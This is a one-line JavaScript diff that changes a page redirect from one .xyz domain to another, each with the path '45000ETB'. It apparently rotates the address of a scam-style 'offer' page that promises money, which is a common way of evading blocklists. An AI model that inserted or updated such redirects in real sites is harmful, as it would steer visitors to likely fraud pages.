@@ -1,1 +1,1 @@
-window.location.href = "https://www.jinfa-offre.xyz/45000ETB";
+window.location.href = "https://www.ntegha-offerz.xyz/45000ETB";
